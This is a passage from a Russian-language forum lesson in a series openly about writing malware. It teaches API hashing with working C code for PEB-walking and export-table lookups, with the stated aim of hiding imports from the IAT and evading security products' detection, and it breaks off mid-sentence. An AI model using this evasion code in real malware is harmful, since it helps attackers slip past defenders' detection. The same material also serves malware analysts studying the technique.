–í–æ—Ç –º—ã –Ω–∞–ø–∏—Å–∞–ª–∏ –¥–≤–µ —Ñ—É–Ω–∫—Ü–∏–∏ GetProcAddressReplacement –∏ GetModuleHandleReplacement, –∫–æ—Ç–æ—Ä—ã–µ –∑–∞–º–µ–Ω—è–ª–∏ GetProcAddress –∏ GetModuleHandle. –≠—Ç–æ–≥–æ –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è Run-Time Dynamic Linking, —á—Ç–æ —Å–∫—Ä—ã–≤–∞–µ—Ç –∏–º–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –æ—Ç IAT. –û–¥–Ω–∞–∫–æ —Å—Ç—Ä–æ–∫–∏, –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã–µ –≤ –∫–æ–¥–µ, –ø–æ–∫–∞–∑—ã–≤–∞—é—Ç, –∫–∞–∫–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏ –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è. –ù–∞–ø—Ä–∏–º–µ—Ä, —Å—Ç—Ä–æ–∫–∞ –Ω–∏–∂–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è VirtualAllocEx.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>GetProcAddressReplacement(GetModuleHandleReplacement(&quot;ntdll.dll&quot;),&quot;VirtualAllocEx&quot;)</code></pre>
	</div>
</div><br />
–†–µ—à–µ–Ω–∏—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –ª–µ–≥–∫–æ –º–æ–≥—É—Ç –∏–∑–≤–ª–µ–∫–∞—Ç—å —Å—Ç—Ä–æ–∫–∏ –∏–∑ —Å–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ –¥–≤–æ–∏—á–Ω–æ–≥–æ —Ñ–∞–π–ª–∞ –∏ —Ä–∞—Å–ø–æ–∑–Ω–∞–≤–∞—Ç—å, —á—Ç–æ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è VirtualAllocEx. –ß—Ç–æ–±—ã —Ä–µ—à–∏—Ç—å —ç—Ç—É –ø—Ä–æ–±–ª–µ–º—É, –∫ –æ–±–µ–∏–º —Ñ—É–Ω–∫—Ü–∏—è–º GetProcAddressReplacement –∏ GetModuleHandleReplacement –±—É–¥–µ—Ç –ø—Ä–∏–º–µ–Ω–µ–Ω –∞–ª–≥–æ—Ä–∏—Ç–º —Ö—ç—à–∏—Ä–æ–≤–∞–Ω–∏—è —Å—Ç—Ä–æ–∫. –í–º–µ—Å—Ç–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Å—Ç—Ä–æ–∫–æ–≤—ã—Ö —Å—Ä–∞–≤–Ω–µ–Ω–∏–π –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ –±–∞–∑–æ–≤–æ–≥–æ –∞–¥—Ä–µ—Å–∞ –º–æ–¥—É–ª—è –∏–ª–∏ –∞–¥—Ä–µ—Å–∞ —Ñ—É–Ω–∫—Ü–∏–∏, —Ñ—É–Ω–∫—Ü–∏–∏ –±—É–¥—É—Ç —Ä–∞–±–æ—Ç–∞—Ç—å —Å —Ö–µ—à-–∑–Ω–∞—á–µ–Ω–∏—è–º–∏.<br />
<br />
<b>–†–µ–∞–ª–∏–∑–∞—Ü–∏—è JenkinsOneAtATime32Bit</b><br />
<br />
–§—É–Ω–∫—Ü–∏–∏ GetProcAddressReplacement –∏ GetModuleHandleReplacement –≤ —ç—Ç–æ–º –º–æ–¥—É–ª–µ –ø–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞–Ω—ã –≤ GetProcAddressH –∏ GetModuleHandleH —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ. –≠—Ç–∏ –æ–±–Ω–æ–≤–ª–µ–Ω–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –∏—Å–ø–æ–ª—å–∑—É—é—Ç –∞–ª–≥–æ—Ä–∏—Ç–º —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è —Å—Ç—Ä–æ–∫ Jenkins One At A Time –¥–ª—è –∑–∞–º–µ–Ω—ã –∏–º–µ–Ω–∏ —Ñ—É–Ω–∫—Ü–∏–∏ –∏ –º–æ–¥—É–ª—è –Ω–∞ —Ö–µ—à-–∑–Ω–∞—á–µ–Ω–∏–µ, –∫–æ—Ç–æ—Ä–æ–µ –∏—Ö –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç. –ù–∞–ø–æ–º–Ω–∏–º, —á—Ç–æ —ç—Ç–æ—Ç –∞–ª–≥–æ—Ä–∏—Ç–º –±—ã–ª –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω —á–µ—Ä–µ–∑ —Ñ—É–Ω–∫—Ü–∏—é JenkinsOneAtATime32Bit, –∫–æ—Ç–æ—Ä–∞—è –±—ã–ª–∞ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∞ –≤ <a href="https://ru-sfera.pw/threads/razrabotka-virusov-25-skrytie-strok.4477" target="_blank" class="link link--external" rel="noopener">—É—Ä–æ–∫–µ —Å–∫—Ä—ã—Ç–∏—è —Å—Ç—Ä–æ–∫.</a><br />
<br />
<b>–•–µ—à–∏—Ä–æ–≤–∞–Ω–∏–µ —Å—Ç—Ä–æ–∫</b><br />
<br />
–ß—Ç–æ–±—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ñ—É–Ω–∫—Ü–∏–∏, –ø–æ–∫–∞–∑–∞–Ω–Ω—ã–µ –≤ —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ, –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø–æ–ª—É—á–∏—Ç—å —Ö–µ—à-–∑–Ω–∞—á–µ–Ω–∏–µ –∏–º–µ–Ω–∏ –º–æ–¥—É–ª—è (–Ω–∞–ø—Ä–∏–º–µ—Ä, User32.dll) –∏ —Ö–µ—à-–∑–Ω–∞—á–µ–Ω–∏–µ –∏–º–µ–Ω–∏ —Ñ—É–Ω–∫—Ü–∏–∏ (–Ω–∞–ø—Ä–∏–º–µ—Ä, MessageBoxA). –≠—Ç–æ –º–æ–∂–Ω–æ —Å–¥–µ–ª–∞—Ç—å, —Å–Ω–∞—á–∞–ª–∞ –≤—ã–≤–æ–¥—è —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –∑–Ω–∞—á–µ–Ω–∏—è –Ω–∞ –∫–æ–Ω—Å–æ–ª—å. –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ –∞–ª–≥–æ—Ä–∏—Ç–º —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —Ç—É –∂–µ –Ω–∞—á–∞–ª—å–Ω—É—é —Ç–æ—á–∫—É.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>int main(){
printf(&quot;[i] –•–µ—à &quot;%s&quot; : 0x%0.8X \n&quot;, &quot;USER32.DLL&quot;, HASHA(&quot;USER32.DLL&quot;)); // –ò–º—è –º–æ–¥—É–ª—è –≤ –≤–µ—Ä—Ö–Ω–µ–º —Ä–µ–≥–∏—Å—Ç—Ä–µ
printf(&quot;[i] –•–µ—à &quot;%s&quot; : 0x%0.8X \n&quot;, &quot;MessageBoxA&quot;, HASHA(&quot;MessageBoxA&quot;));

return 0;
}</code></pre>
	</div>
</div><br />
–í—ã—à–µ—É–∫–∞–∑–∞–Ω–Ω–∞—è –æ—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –≤—ã–≤–µ–¥–µ—Ç —Å–ª–µ–¥—É—é—â–µ–µ:<br />
<br />
 –•–µ—à &quot;USER32.DLL&quot; : 0x81E3778E<br />
 –•–µ—à &quot;MessageBoxA&quot; : 0xF10E27CA<br />
<br />
–≠—Ç–∏ —Ö–µ—à-–∑–Ω–∞—á–µ–Ω–∏—è —Ç–µ–ø–µ—Ä—å –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Å —Ñ—É–Ω–∫—Ü–∏—è–º–∏ –Ω–∏–∂–µ.<br />
<br />
<b>–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ </b><br />
<br />
–§—É–Ω–∫—Ü–∏–∏ –±—É–¥—É—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è —Ç–∞–∫–∏–º –∂–µ –æ–±—Ä–∞–∑–æ–º, –∑–∞ –∏—Å–∫–ª—é—á–µ–Ω–∏–µ–º —Ç–æ–≥–æ, —á—Ç–æ —Ç–µ–ø–µ—Ä—å –ø–µ—Ä–µ–¥–∞–µ—Ç—Å—è —Ö–µ—à-–∑–Ω–∞—á–µ–Ω–∏–µ, –∞ –Ω–µ —Å—Ç—Ä–æ–∫–æ–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// 0x81E3778E - —ç—Ç–æ —Ö–µ—à USER32.DLL
// 0xF10E27CA - —ç—Ç–æ —Ö–µ—à MessageBoxA
fnMessageBoxA pMessageBoxA = GetProcAddressH(GetModuleHandleH(0x81E3778E),0xF10E27CA);</code></pre>
	</div>
</div><br />
<b>–§—É–Ω–∫—Ü–∏—è GetProcAddressH</b><br />
<br />
GetProcAddressH - —ç—Ç–æ —Ñ—É–Ω–∫—Ü–∏—è, —ç–∫–≤–∏–≤–∞–ª–µ–Ω—Ç–Ω–∞—è GetProcAddressReplacement, –æ—Å–Ω–æ–≤–Ω–æ–µ –æ—Ç–ª–∏—á–∏–µ –∫–æ—Ç–æ—Ä–æ–π –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ —Ç–æ–º, —á—Ç–æ —Ö–µ—à-–∑–Ω–∞—á–µ–Ω–∏—è –∞–ª–≥–æ—Ä–∏—Ç–º–∞ —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è —Å—Ç—Ä–æ–∫ JenkinsOneAtATime32Bit –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –¥–ª—è —Å—Ä–∞–≤–Ω–µ–Ω–∏—è —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä—É–µ–º—ã—Ö –∏–º–µ–Ω —Ñ—É–Ω–∫—Ü–∏–π —Å –≤—Ö–æ–¥–Ω—ã–º —Ö–µ—à–µ–º.<br />
<br />
–¢–∞–∫–∂–µ —Å—Ç–æ–∏—Ç –æ—Ç–º–µ—Ç–∏—Ç—å, —á—Ç–æ –∫–æ–¥ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –¥–≤–∞ –º–∞–∫—Ä–æ—Å–∞, —á—Ç–æ–±—ã —Å–¥–µ–ª–∞—Ç—å –∫–æ–¥ –±–æ–ª–µ–µ —á–∏—Å—Ç—ã–º –∏ –ª–µ–≥–∫–∏–º –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –≤ –±—É–¥—É—â–µ–º.<br />
<br />
HASHA - –í—ã–∑–æ–≤ HashStringJenkinsOneAtATime32BitA (ASCII)<br />
HASHW - –í—ã–∑–æ–≤ HashStringJenkinsOneAtATime32BitW (UNICODE)<br />
<br />
#define HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API))<br />
#define HASHW(API) (HashStringJenkinsOneAtATime32BitW((PWCHAR) API))<br />
<br />
<b>–ò—Å—Ö–æ–¥—è –∏–∑ —ç—Ç–æ–≥–æ, GetProcAddressH –ø–æ–∫–∞–∑–∞–Ω –Ω–∏–∂–µ. </b><br />
<br />
–§—É–Ω–∫—Ü–∏—è –ø—Ä–∏–Ω–∏–º–∞–µ—Ç –¥–≤–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞:<br />
<br />
hModule - –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –º–æ–¥—É–ª—è DLL, —Å–æ–¥–µ—Ä–∂–∞—â–µ–≥–æ —Ñ—É–Ω–∫—Ü–∏—é.<br />
dwApiNameHash - —Ö–µ—à-–∑–Ω–∞—á–µ–Ω–∏–µ –∏–º–µ–Ω–∏ —Ñ—É–Ω–∫—Ü–∏–∏, —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –µ–µ –∞–¥—Ä–µ—Å.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {

if (hModule == NULL || dwApiNameHash == NULL)
    return NULL;

PBYTE pBase = (PBYTE)hModule;

PIMAGE_DOS_HEADER         pImgDosHdr              = (PIMAGE_DOS_HEADER)pBase;
if (pImgDosHdr-&gt;e_magic != IMAGE_DOS_SIGNATURE)
    return NULL;

PIMAGE_NT_HEADERS         pImgNtHdrs              = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-&gt;e_lfanew);
if (pImgNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)
    return NULL;

IMAGE_OPTIONAL_HEADER     ImgOptHdr              = pImgNtHdrs-&gt;OptionalHeader;

PIMAGE_EXPORT_DIRECTORY   pImgExportDir          = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

PDWORD  FunctionNameArray    = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfNames);
PDWORD  FunctionAddressArray    = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfFunctions);
PWORD   FunctionOrdinalArray    = (PWORD)(pBase + pImgExportDir-&gt;AddressOfNameOrdinals);

for (DWORD i = 0; i &lt; pImgExportDir-&gt;NumberOfFunctions; i++) {
    CHAR*    pFunctionName       = (CHAR*)(pBase + FunctionNameArray[i]);
    PVOID    pFunctionAddress    = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

    // –•–µ—à–∏—Ä–æ–≤–∞–Ω–∏–µ –∫–∞–∂–¥–æ–≥–æ –∏–º–µ–Ω–∏ —Ñ—É–Ω–∫—Ü–∏–∏ pFunctionName
    // –ï—Å–ª–∏ –æ–±–∞ —Ö–µ—à–∞ —Ä–∞–≤–Ω—ã, –∑–Ω–∞—á–∏—Ç, –º—ã –Ω–∞—à–ª–∏ –Ω—É–∂–Ω—É—é —Ñ—É–Ω–∫—Ü–∏—é
    if (dwApiNameHash == HASHA(pFunctionName)) {
        return pFunctionAddress;
    }
}

return NULL;
}</code></pre>
	</div>
</div><br />
<b>GetModuleHandleH</b><br />
<br />
–§—É–Ω–∫—Ü–∏—è GetModuleHandleH —Ç–∞–∫–∞—è –∂–µ, –∫–∞–∫ –∏ GetModuleHandleReplacement, –æ—Å–Ω–æ–≤–Ω–æ–µ –æ—Ç–ª–∏—á–∏–µ —Å–æ—Å—Ç–æ–∏—Ç –≤ —Ç–æ–º, —á—Ç–æ —Ö–µ—à-–∑–Ω–∞—á–µ–Ω–∏—è –∞–ª–≥–æ—Ä–∏—Ç–º–∞ —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è —Å—Ç—Ä–æ–∫ JenkinsOneAtATime32Bit –±—É–¥—É—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –¥–ª—è —Å—Ä–∞–≤–Ω–µ–Ω–∏—è –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–Ω—ã—Ö –∏–º–µ–Ω DLL —Å –≤—Ö–æ–¥–Ω—ã–º —Ö–µ—à–µ–º.<br />
<br />
–û–±—Ä–∞—Ç–∏—Ç–µ –≤–Ω–∏–º–∞–Ω–∏–µ –Ω–∞ —Ç–æ, –∫–∞–∫ —Ñ—É–Ω–∫—Ü–∏—è –ø—Ä–µ–æ–±—Ä–∞–∑—É–µ—Ç —Å—Ç—Ä–æ–∫—É –≤ FullDllName.Buffer –≤ –≤–µ—Ä—Ö–Ω–∏–π —Ä–µ–≥–∏—Å—Ç—Ä, —Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ, –ø–∞—Ä–∞–º–µ—Ç—Ä dwModuleNameHash –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —Ö–µ—à-–∑–Ω–∞—á–µ–Ω–∏–µ–º –∏–º–µ–Ω–∏ –º–æ–¥—É–ª—è –≤ –≤–µ—Ä—Ö–Ω–µ–º —Ä–µ–≥–∏—Å—Ç—Ä–µ (–Ω–∞–ø—Ä–∏–º–µ—Ä, USER32.DLL).<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {

if (dwModuleNameHash == NULL)
    return NULL;
#ifdef _WIN64
PPEB pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
PPEB pPeb = (PEB*)(__readfsdword(0x30));
#endif

PPEB_LDR_DATA            pLdr  = (PPEB_LDR_DATA)(pPeb-&gt;Ldr);
PLDR_DATA_TABLE_ENTRY    pDte  = (PLDR_DATA_TABLE_ENTRY)(pLdr-&gt;InMemoryOrderModuleList.Flink);

while (pDte) {

    if (pDte-&gt;FullDllName.Length != NULL &amp;&amp; pDte-&gt;FullDllName.Length &lt; MAX_PATH) {

        // –ü—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏–µ `FullDllName.Buffer` –≤ —Å—Ç—Ä–æ–∫—É –≤–µ—Ä—Ö–Ω–µ–≥–æ —Ä–µ–≥–∏—Å—Ç—Ä–∞
        CHAR UpperCaseDllName[MAX_PATH];

        DWORD i = 0;
        while (pDte-&gt;FullDllName.Buffer[i]) {
            UpperCaseDllName[i] = (CHAR)toupper(pDte-&gt;FullDllName.Buffer[i]);
            i++;
        }
        UpperCaseDllName[i] = &#039;\0&#039;;

        // —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏–µ `UpperCaseDllName` –∏ —Å—Ä–∞–≤–Ω–µ–Ω–∏–µ —Ö–µ—à-–∑–Ω–∞—á–µ–Ω–∏—è —Å —Ç–µ–º, —á—Ç–æ –≤–æ –≤—Ö–æ–¥–Ω–æ–º `dwModuleNameHash`
        if (HASHA(UpperCaseDllName) == dwModuleNameHash)
            return pDte-&gt;Reserved2[0];

    }
    else {
        break;
    }

    pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
}

return NULL;
}</code></pre>
	</div>
</div><br />
<b>–î–µ–º–æ</b><br />
<br />
–≠—Ç–æ –¥–µ–º–æ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç GetModuleHandleH –∏ GetProcAddressH –¥–ª—è –≤—ã–∑–æ–≤–∞ MessageBoxA.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#define USER32DLL_HASH 0x81E3778E
               #define MessageBoxA_HASH 0xF10E27CAint

main() {

// –ó–∞–≥—Ä—É–∑–∏—Ç–µ User32.dll –≤ —Ç–µ–∫—É—â–∏–π –ø—Ä–æ—Ü–µ—Å—Å, —á—Ç–æ–±—ã GetModuleHandleH —Ä–∞–±–æ—Ç–∞–ª
if (LoadLibraryA(&quot;USER32.DLL&quot;) == NULL) {
    printf(&quot;[!] LoadLibraryA –Ω–µ —É–¥–∞–ª–æ—Å—å —Å –æ—à–∏–±–∫–æ–π : %d \n&quot;, GetLastError());
    return 0;
}

// –ü–æ–ª—É—á–µ–Ω–∏–µ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ user32.dll —Å –ø–æ–º–æ—â—å—é GetModuleHandleH
HMODULE hUser32Module = GetModuleHandleH(USER32DLL_HASH);
if (hUser32Module == NULL){
    printf(&quot;[!] –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä User32.dll \n&quot;);
    return -1;
}

// –ü–æ–ª—É—á–µ–Ω–∏–µ –∞–¥—Ä–µ—Å–∞ —Ñ—É–Ω–∫—Ü–∏–∏ MessageBoxA —Å –ø–æ–º–æ—â—å—é GetProcAddressH
fnMessageBoxA pMessageBoxA = (fnMessageBoxA)GetProcAddressH(hUser32Module, MessageBoxA_HASH);
if (pMessageBoxA == NULL) {
    printf(&quot;[!] –ù–µ —É–¥–∞–ª–æ—Å—å –Ω–∞–π—Ç–∏ –∞–¥—Ä–µ—Å —É–∫–∞–∑–∞–Ω–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ \n&quot;);
    return -1;
}

// –í—ã–∑–æ–≤ MessageBoxA
pMessageBoxA(NULL, &quot;–°–æ–∑–¥–∞–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º —Å RuSfera&quot;, &quot;–í–∞—É&quot;, MB_OK | MB_ICONEXCLAMATION);

printf(&quot;[#] –ù–∞–∂–º–∏—Ç–µ &lt;Enter&gt;, —á—Ç–æ–±—ã –≤—ã–π—Ç–∏ ... &quot;);
getchar();

return 0;
}</code></pre>
	</div>
</div><br />
<div class="bbImageWrapper  js-lbImage" title="1746784951280.png"
		data-src="https://osint42.org/attachments/1746784951280-png.188/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784951280-png.188/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784951280.png"
			title="1746784951280.png"
			width="1306" height="527" loading="lazy" />
	</div><br />
<br />
–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Ö—ç—à–∏—Ä–æ–≤–∞–Ω–∏—è API –¥–ª—è –º–∞—Å–∫–∏—Ä–æ–≤–∫–∏ IAT —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ —è–≤–ª—è–µ—Ç—Å—è —ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω—ã–º –º–µ—Ç–æ–¥–æ–º. –û–¥–Ω–∞–∫–æ –∏–Ω–æ–≥–¥–∞ –∑–∞–º–µ–Ω–∞ —Å–∞–º–æ–≥–æ WinAPI, –µ—Å–ª–∏ —ç—Ç–æ –≤–æ–∑–º–æ–∂–Ω–æ, –º–æ–∂–µ—Ç —É–ª—É—á—à–∏—Ç—å —Å–∫—Ä—ã—Ç–Ω–æ—Å—Ç—å IAT, —É–º–µ–Ω—å—à–∞—è –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ö—ç—à-–∑–Ω–∞—á–µ–Ω–∏–π, –∞ —Ç–∞–∫–∂–µ —É–º–µ–Ω—å—à–∞—è –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω—ã–µ —ç–≤—Ä–∏—Å—Ç–∏—á–µ—Å–∫–∏–µ —Å–∏–≥–Ω–∞—Ç—É—Ä—ã, —Å–≤—è–∑–∞–Ω–Ω—ã–µ —Å –∞–ª–≥–æ—Ä–∏—Ç–º–æ–º —Ö—ç—à–∏—Ä–æ–≤–∞–Ω–∏—è API. –ö—Ä–æ–º–µ —Ç–æ–≥–æ, —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–≥–æ –∫–æ–¥–∞ –¥–ª—è —Ñ—É–Ω–∫—Ü–∏–∏ WinAPI –º–æ–∂–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –≤ —Ä–∞–∑–ª–∏—á–Ω—ã—Ö —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—è—Ö, —á—Ç–æ —É–ø—Ä–æ—â–∞–µ—Ç –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü–∏—é –æ–±—â–µ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ —Å–∫—Ä—ã—Ç–∏—è IAT.<br />
<br />
–ú–æ–∂–Ω–æ –ø–æ—Å–º–æ—Ç—Ä–µ—Ç—å —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—é –Ω–µ–∫–æ—Ç–æ—Ä—ã—Ö API –∑–¥–µ—Å—å:<a href="https://github.com/vxunderground/VX-API" target="_blank" class="link link--external" rel="noopener">GitHub - vxunderground/VX-API: Collection of various malicious functionality to aid in malware development</a><br />
<br />
<b>–ì–µ–Ω–µ—Ä–∞—Ü–∏—è —Ö–µ—à–µ–π –≤–æ –≤—Ä–µ–º—è –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ –ø—Ä–æ–≥—Ä–∞–º–º—ã</b><br />
–í —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è API —Ö–µ—à–∏ —Ñ—É–Ω–∫—Ü–∏–π –∏ –º–æ–¥—É–ª–µ–π –≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–ª–∏—Å—å –ø–µ—Ä–µ–¥ –∏—Ö –¥–æ–±–∞–≤–ª–µ–Ω–∏–µ–º –≤ –∫–æ–¥. –ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —ç—Ç–æ –º–æ–∂–µ—Ç –∑–∞–Ω—è—Ç—å –º–Ω–æ–≥–æ –≤—Ä–µ–º–µ–Ω–∏, –∏ —ç—Ç–æ–≥–æ –º–æ–∂–Ω–æ –∏–∑–±–µ–∂–∞—Ç—å, –∏—Å–ø–æ–ª—å–∑—É—è —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏–µ API –≤–æ –≤—Ä–µ–º—è –∫–æ–º–ø–∏–ª—è—Ü–∏–∏.<br />
<br />
–ö—Ä–æ–º–µ —Ç–æ–≥–æ, –≤ —Å—Ç–∞—Ç—å–µ –≤—ã—à–µ —Ö–µ—à–∏ –±—ã–ª–∏ –∂–µ—Å—Ç–∫–æ –∑–∞–∫–æ–¥–∏—Ä–æ–≤–∞–Ω—ã, —á—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç —Å–∏—Å—Ç–µ–º–∞–º –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∏—Ö –≤ –∫–∞—á–µ—Å—Ç–≤–µ –∏–Ω–¥–∏–∫–∞—Ç–æ—Ä–æ–≤ –∑–∞—Ä–∞–∂–µ–Ω–∏—è, –µ—Å–ª–∏ –æ–Ω–∏ –Ω–µ –æ–±–Ω–æ–≤–ª—è—é—Ç—Å—è –≤ –∫–∞–∂–¥–æ–π —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏. –û–¥–Ω–∞–∫–æ –ø—Ä–∏ —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏–∏ API –≤–æ –≤—Ä–µ–º—è –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏–µ —Ö–µ—à–∏ –≥–µ–Ω–µ—Ä–∏—Ä—É—é—Ç—Å—è –∫–∞–∂–¥—ã–π —Ä–∞–∑ 